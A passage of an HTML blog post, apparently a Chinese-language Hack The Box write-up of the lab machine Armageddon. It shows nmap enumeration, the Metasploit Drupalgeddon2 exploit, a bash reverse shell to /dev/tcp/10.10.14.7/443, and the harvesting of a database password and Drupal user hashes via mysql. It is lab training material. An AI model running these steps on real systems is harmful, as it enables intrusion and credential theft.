@@ -1,0 +1,665 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="H0ne">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="第一步：枚举123456789101112131415161718192021222324252627282930313233343536373839404142434445464748└─# nmap -sV -O -F --version-light 10.10.10.233       Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-07-19">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB-Armageddon">
+<meta property="og:url" content="http://example.com/2023/04/20/HTB-%20Armageddon/index.html">
+<meta property="og:site_name" content="H0ne&#39;s Blog">
+<meta property="og:description" content="第一步：枚举123456789101112131415161718192021222324252627282930313233343536373839404142434445464748└─# nmap -sV -O -F --version-light 10.10.10.233       Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-07-19">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/f2a6c769a8e942f59a484eb08ea3c822.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/d625694160e342a39dffae866e106c27.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/af30dbb5f987411292cf12b16a4629d3.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/70363153f0e048278edcbdcf2f4f9755.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/1c58d3246c54473b9380a04828528682.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/12ae039f8c7d4210af015fd8a6b2a1ff.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/4f479709b1e14411979a44374ed6c7c8.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/de8f273efc3049d2adcdd676d2660270.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2ebb27e34af14a0baae8e02935885c85.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/9613f36917cc4c5590a6ae176f90f473.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/747f66b006fc42ac9bf223417779a4c4.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2698487ae2dc47e1b95f29dcff9f2615.png">
+<meta property="article:published_time" content="2023-04-20T15:33:27.621Z">
+<meta property="article:modified_time" content="2023-04-20T15:21:50.191Z">
+<meta property="article:author" content="H0ne">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/f2a6c769a8e942f59a484eb08ea3c822.png">
+  
+  
+  
+  <title>HTB-Armageddon - H0ne&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/fluid-extension.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/shubiao.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/scroll.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>H0ne&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HTB-Armageddon"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-04-20 23:33" pubdate>
+          2023年4月20日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          10k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          84 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">HTB-Armageddon</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="第一步：枚举"><a href="#第一步：枚举" class="headerlink" title="第一步：枚举"></a>第一步：枚举</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python">└─<span class="hljs-comment"># nmap -sV -O -F --version-light 10.10.10.233       </span><br>Starting Nmap <span class="hljs-number">7.92</span> ( https://nmap.org ) at <span class="hljs-number">2022</span>-07-<span class="hljs-number">19</span> <span class="hljs-number">12</span>:<span class="hljs-number">53</span> EDT<br>Stats: <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:06 elapsed; <span class="hljs-number">0</span> hosts completed (<span class="hljs-number">0</span> up), <span class="hljs-number">1</span> undergoing Ping Scan<br>Ping Scan Timing: About <span class="hljs-number">50.00</span>% done; ETC: <span class="hljs-number">12</span>:<span class="hljs-number">53</span> (<span class="hljs-number">0</span>:<span class="hljs-number">00</span>:01 remaining)<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.233</span><br>Host <span class="hljs-keyword">is</span> up (<span class="hljs-number">0.73</span>s latency).<br>Not shown: <span class="hljs-number">98</span> closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br><span class="hljs-number">22</span>/tcp <span class="hljs-built_in">open</span>  ssh     OpenSSH <span class="hljs-number">7.4</span> (protocol <span class="hljs-number">2.0</span>)<br><span class="hljs-number">80</span>/tcp <span class="hljs-built_in">open</span>  http    Apache httpd <span class="hljs-number">2.4</span><span class="hljs-number">.6</span> ((CentOS) PHP/<span class="hljs-number">5.4</span><span class="hljs-number">.16</span>)<br>Aggressive OS guesses: Linux <span class="hljs-number">3.16</span> (<span class="hljs-number">95</span>%), ASUS RT-N56U WAP (Linux <span class="hljs-number">3.4</span>) (<span class="hljs-number">94</span>%), Linux <span class="hljs-number">3.1</span> (<span class="hljs-number">93</span>%), Linux <span class="hljs-number">3.2</span> (<span class="hljs-number">93</span>%), Linux <span class="hljs-number">3.2</span> - <span class="hljs-number">4.9</span> (<span class="hljs-number">92</span>%), Linux <span class="hljs-number">4.10</span> (<span class="hljs-number">92</span>%), AXIS <span class="hljs-number">2</span>10A <span class="hljs-keyword">or</span> <span class="hljs-number">211</span> Network Camera (Linux <span class="hljs-number">2.6</span><span class="hljs-number">.17</span>) (<span class="hljs-number">92</span>%), Linux <span class="hljs-number">3.12</span> (<span class="hljs-number">91</span>%), Linux <span class="hljs-number">3.13</span> (<span class="hljs-number">91</span>%), Linux <span class="hljs-number">3.8</span> - <span class="hljs-number">3.11</span> (<span class="hljs-number">91</span>%)<br>No exact OS matches <span class="hljs-keyword">for</span> host (test conditions non-ideal).<br>Network Distance: <span class="hljs-number">2</span> hops<br><br>OS <span class="hljs-keyword">and</span> Service detection performed. Please report <span class="hljs-built_in">any</span> incorrect results at https://nmap.org/submit/ .<br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">42.78</span> seconds<br><br>└─<span class="hljs-comment"># nmap -A 10.10.10.233                       </span><br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.233</span><br>Host <span class="hljs-keyword">is</span> up (<span class="hljs-number">0.73</span>s latency).<br>Not shown: <span class="hljs-number">998</span> closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br><span class="hljs-number">22</span>/tcp <span class="hljs-built_in">open</span>  ssh     OpenSSH <span class="hljs-number">7.4</span> (protocol <span class="hljs-number">2.0</span>)<br>| ssh-hostkey: <br>|   <span class="hljs-number">2048</span> <span class="hljs-number">82</span>:c6:bb:c7:02:6a:<span class="hljs-number">93</span>:bb:7c:cb:dd:9c:<span class="hljs-number">30</span>:<span class="hljs-number">93</span>:<span class="hljs-number">79</span>:<span class="hljs-number">34</span> (RSA)<br>|   <span class="hljs-number">256</span> 3a:ca:<span class="hljs-number">95</span>:<span class="hljs-number">30</span>:f3:<span class="hljs-number">12</span>:d7:ca:<span class="hljs-number">45</span>:05:bc:c7:f1:<span class="hljs-number">16</span>:bb:fc (ECDSA)<br>|_  <span class="hljs-number">256</span> 7a:d4:b3:<span class="hljs-number">68</span>:<span class="hljs-number">79</span>:cf:<span class="hljs-number">62</span>:8a:7d:5a:<span class="hljs-number">61</span>:e7:06:0f:5f:<span class="hljs-number">33</span> (ED25519)<br><span class="hljs-number">80</span>/tcp <span class="hljs-built_in">open</span>  http    Apache httpd <span class="hljs-number">2.4</span><span class="hljs-number">.6</span> ((CentOS) PHP/<span class="hljs-number">5.4</span><span class="hljs-number">.16</span>)<br>|_http-server-header: Apache/<span class="hljs-number">2.4</span><span class="hljs-number">.6</span> (CentOS) PHP/<span class="hljs-number">5.4</span><span class="hljs-number">.16</span><br>| http-robots.txt: <span class="hljs-number">36</span> disallowed entries (<span class="hljs-number">15</span> shown)<br>| /includes/ /misc/ /modules/ /profiles/ /scripts/ <br>| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt <br>| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt <br>|_/LICENSE.txt /MAINTAINERS.txt<br>|_http-generator: Drupal <span class="hljs-number">7</span> (http://drupal.org)<br>|_http-title: Welcome to  Armageddon |  Armageddon<br>Aggressive OS guesses: Linux <span class="hljs-number">3.2</span> - <span class="hljs-number">4.9</span> (<span class="hljs-number">95</span>%), Linux <span class="hljs-number">3.16</span> (<span class="hljs-number">95</span>%), ASUS RT-N56U WAP (Linux <span class="hljs-number">3.4</span>) (<span class="hljs-number">95</span>%), Linux <span class="hljs-number">3.18</span> (<span class="hljs-number">93</span>%), Linux <span class="hljs-number">3.1</span> (<span class="hljs-number">93</span>%), Linux <span class="hljs-number">3.2</span> (<span class="hljs-number">93</span>%), Linux <span class="hljs-number">4.10</span> (<span class="hljs-number">93</span>%), AXIS <span class="hljs-number">2</span>10A <span class="hljs-keyword">or</span> <span class="hljs-number">211</span> Network Camera (Linux <span class="hljs-number">2.6</span><span class="hljs-number">.17</span>) (<span class="hljs-number">92</span>%), Linux <span class="hljs-number">3.10</span> - <span class="hljs-number">3.13</span> (<span class="hljs-number">92</span>%), Linux <span class="hljs-number">3.11</span> - <span class="hljs-number">3.14</span> (<span class="hljs-number">92</span>%)<br>No exact OS matches <span class="hljs-keyword">for</span> host (test conditions non-ideal).<br>Network Distance: <span class="hljs-number">2</span> hops<br><br>TRACEROUTE (using port <span class="hljs-number">8888</span>/tcp)<br>HOP RTT       ADDRESS<br><span class="hljs-number">1</span>   <span class="hljs-number">860.67</span> ms <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.1</span><br><span class="hljs-number">2</span>   <span class="hljs-number">860.74</span> ms <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.233</span><br><br>OS <span class="hljs-keyword">and</span> Service detection performed. Please report <span class="hljs-built_in">any</span> incorrect results at https://nmap.org/submit/ .<br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">379.27</span> seconds<br><br></code></pre></td></tr></table></figure>
+<p>可以看到有22端口服务是OpenSSH 7.4 (protocol 2.0)，<br>80端口 Apache httpd 2.4.6 ((CentOS) PHP&#x2F;5.4.16)，robots.txt下面藏有文件<br>访问&#x2F;CHANGELOG.txt  从这里发现Drupal版本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><br>Drupal <span class="hljs-number">7.56</span>, <span class="hljs-number">2017</span>-06-<span class="hljs-number">21</span><br>-----------------------<br>- Fixed security issues (access bypass). See SA-CORE-<span class="hljs-number">2017</span>-<span class="hljs-number">003.</span><br><br></code></pre></td></tr></table></figure>
+<p>用searchsploit查找是否存在相关漏洞</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">└─<span class="hljs-comment"># searchsploit -w drupal 7.56</span><br>--------------------------------------------------------------------------------------------------------------------- --------------------------------------------<br> Exploit Title                                                                                                       |  URL<br>--------------------------------------------------------------------------------------------------------------------- --------------------------------------------<br>Drupal &lt; <span class="hljs-number">7.58</span> - <span class="hljs-string">&#x27;Drupalgeddon3&#x27;</span> (Authenticated) Remote Code (Metasploit)                                             | https://www.exploit-db.com/exploits/<span class="hljs-number">44557</span><br>Drupal &lt; <span class="hljs-number">7.58</span> - <span class="hljs-string">&#x27;Drupalgeddon3&#x27;</span> (Authenticated) Remote Code Execution (PoC)                                          | https://www.exploit-db.com/exploits/<span class="hljs-number">44542</span><br>Drupal &lt; <span class="hljs-number">7.58</span> / &lt; <span class="hljs-number">8.3</span><span class="hljs-number">.9</span> / &lt; <span class="hljs-number">8.4</span><span class="hljs-number">.6</span> / &lt; <span class="hljs-number">8.5</span><span class="hljs-number">.1</span> - <span class="hljs-string">&#x27;Drupalgeddon2&#x27;</span> Remote Code Execution                                  | https://www.exploit-db.com/exploits/<span class="hljs-number">44449</span><br>Drupal &lt; <span class="hljs-number">8.3</span><span class="hljs-number">.9</span> / &lt; <span class="hljs-number">8.4</span><span class="hljs-number">.6</span> / &lt; <span class="hljs-number">8.5</span><span class="hljs-number">.1</span> - <span class="hljs-string">&#x27;Drupalgeddon2&#x27;</span> Remote Code Execution (Metasploit)                              | https://www.exploit-db.com/exploits/<span class="hljs-number">44482</span><br>Drupal &lt; <span class="hljs-number">8.3</span><span class="hljs-number">.9</span> / &lt; <span class="hljs-number">8.4</span><span class="hljs-number">.6</span> / &lt; <span class="hljs-number">8.5</span><span class="hljs-number">.1</span> - <span class="hljs-string">&#x27;Drupalgeddon2&#x27;</span> Remote Code Execution (PoC)                                     | https://www.exploit-db.com/exploits/<span class="hljs-number">44448</span><br>Drupal &lt; <span class="hljs-number">8.5</span><span class="hljs-number">.11</span> / &lt; <span class="hljs-number">8.6</span><span class="hljs-number">.10</span> - RESTful Web Services unserialize() Remote Command Execution (Metasploit)                | https://www.exploit-db.com/exploits/<span class="hljs-number">46510</span><br>Drupal &lt; <span class="hljs-number">8.6</span><span class="hljs-number">.10</span> / &lt; <span class="hljs-number">8.5</span><span class="hljs-number">.11</span> - REST Module Remote Code Execution                                                       | https://www.exploit-db.com/exploits/<span class="hljs-number">46452</span><br>Drupal &lt; <span class="hljs-number">8.6</span><span class="hljs-number">.9</span> - REST Module Remote Code Execution                                                                   | https://www.exploit-db.com/exploits/<span class="hljs-number">46459</span><br>--------------------------------------------------------------------------------------------------------------------- --------------------------------------------<br>Shellcodes: No Results<br></code></pre></td></tr></table></figure>
+<p>重点关注  Drupal &lt; 8.3.9 &#x2F; &lt; 8.4.6 &#x2F; &lt; 8.5.1 - ‘Drupalgeddon2’ Remote Code Execution (Metasploit)  这是个metasploit的远程代码执行</p>
+<h2 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a>远程代码执行</h2><p>msfconsole启动后输入search drupalgeddon2</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python">msf6 &gt; search drupalgeddon2<br><br>Matching Modules<br>================<br><br>   <span class="hljs-comment">#  Name                                      Disclosure Date  Rank       Check  Description</span><br>   -  ----                                      ---------------  ----       -----  -----------<br>   <span class="hljs-number">0</span>  exploit/unix/webapp/drupal_drupalgeddon2  <span class="hljs-number">2018</span>-03-<span class="hljs-number">28</span>       excellent  Yes    Drupal Drupalgeddon <span class="hljs-number">2</span> Forms API Property Injection<br><br><br>Interact <span class="hljs-keyword">with</span> a module by name <span class="hljs-keyword">or</span> index. For example info <span class="hljs-number">0</span>, use <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> use exploit/unix/webapp/drupal_drupalgeddon2<br>msf6 &gt; use exploit/unix/webapp/drupal_drupalgeddon2 <br>[*] No payload configured, defaulting to php/meterpreter/reverse_tcp<br>msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; show options<br><br>Module options (exploit/unix/webapp/drupal_drupalgeddon2):<br><br>   Name         Current Setting  Required  Description<br>   ----         ---------------  --------  -----------<br>   DUMP_OUTPUT  false            no        Dump payload command output<br>   PHP_FUNC     passthru         yes       PHP function to execute<br>   Proxies                       no        A proxy chain of <span class="hljs-built_in">format</span> <span class="hljs-built_in">type</span>:host:port[,<span class="hljs-built_in">type</span>:host:port][...]<br>   RHOSTS                        yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit<br>   RPORT        <span class="hljs-number">80</span>               yes       The target port (TCP)<br>   SSL          false            no        Negotiate SSL/TLS <span class="hljs-keyword">for</span> outgoing connections<br>   TARGETURI    /                yes       Path to Drupal install<br>   VHOST                         no        HTTP server virtual host<br><br><br>Payload options (php/meterpreter/reverse_tcp):<br><br>   Name   Current Setting  Required  Description<br>   ----   ---------------  --------  -----------<br>   LHOST  <span class="hljs-number">192.168</span><span class="hljs-number">.126</span><span class="hljs-number">.128</span>  yes       The listen address (an interface may be specified)<br>   LPORT  <span class="hljs-number">4444</span>             yes       The listen port<br><br><br>Exploit target:<br><br>   Id  Name<br>   --  ----<br>   <span class="hljs-number">0</span>   Automatic (PHP In-Memory)<br><br><br>msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; <span class="hljs-built_in">set</span> RHOSTS <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.233</span><br>RHOSTS =&gt; <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.233</span><br>msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; <span class="hljs-built_in">set</span> LHOST <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.7</span><br>LHOST =&gt; <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.7</span><br>msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; exploit<br><br>[*] Started reverse TCP handler on <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.7</span>:<span class="hljs-number">4444</span> <br>[*] Running automatic check (<span class="hljs-string">&quot;set AutoCheck false&quot;</span> to disable)<br>[+] The target <span class="hljs-keyword">is</span> vulnerable.<br>[*] Sending stage (<span class="hljs-number">39860</span> <span class="hljs-built_in">bytes</span>) to <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.233</span><br>[*] Meterpreter session <span class="hljs-number">1</span> opened (<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.7</span>:<span class="hljs-number">4444</span> -&gt; <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.233</span>:<span class="hljs-number">58194</span> ) at <span class="hljs-number">2022</span>-07-<span class="hljs-number">20</span> <span class="hljs-number">12</span>:01:<span class="hljs-number">27</span> -0400<br><br>meterpreter &gt;<br></code></pre></td></tr></table></figure>
+<p>这里就建立起了监听,然后我进入&#x2F;home文件里没访问权限，不能进入&#x2F;root内部</p>
+<p>使用netcat开启本地监听</p>
+<p><img src="https://img-blog.csdnimg.cn/f2a6c769a8e942f59a484eb08ea3c822.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>bash -c ‘bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.7&#x2F;443 0&gt;&amp;1’</p>
+<p>bash -i 启动交互式命令 bash<br>-i 将输出重定向到文件<br>&#x2F;dev&#x2F;tcp 靶机为linux的设备 &#x2F;dev&#x2F;tcp连接程序启动socket（linux系统，所有程序都是目录文件）<br>0&gt;&amp;1 远程的输入和输出（消息呈现方式为远程）</p>
+<p><img src="https://img-blog.csdnimg.cn/d625694160e342a39dffae866e106c27.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>然后使用grep -R -i password命令寻找mysql数据库的password<br><img src="https://img-blog.csdnimg.cn/af30dbb5f987411292cf12b16a4629d3.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>在sites&#x2F;default&#x2F;settings.php:      ‘password’ &#x3D;&gt; ‘CQHEy@9M<em>m23gBVj’,这里发现密码<br>咱们查看一下sites&#x2F;default&#x2F;settings.php的文件内容<br>cat sites&#x2F;default&#x2F;settings.php<br><img src="https://img-blog.csdnimg.cn/70363153f0e048278edcbdcf2f4f9755.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>这里有mysql数据库的各种信息<br>接下来我们登陆mysql数据库<br>mysql -D drupal -u drupaluser -pCQHEy@9M</em>m23gBVj -e ‘show tables;’ 发现了user表<br>mysql -D drupal -u drupaluser -pCQHEy@9M<em>m23gBVj -e ‘describe users;’<br><img src="https://img-blog.csdnimg.cn/1c58d3246c54473b9380a04828528682.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>查询pass,name的值<br>mysql -D drupal -u drupaluser -pCQHEy@9M</em>m23gBVj -e ‘select name, pass from users;’<br><img src="https://img-blog.csdnimg.cn/12ae039f8c7d4210af015fd8a6b2a1ff.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">brucetherealadmin       $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt<br></code></pre></td></tr></table></figure>
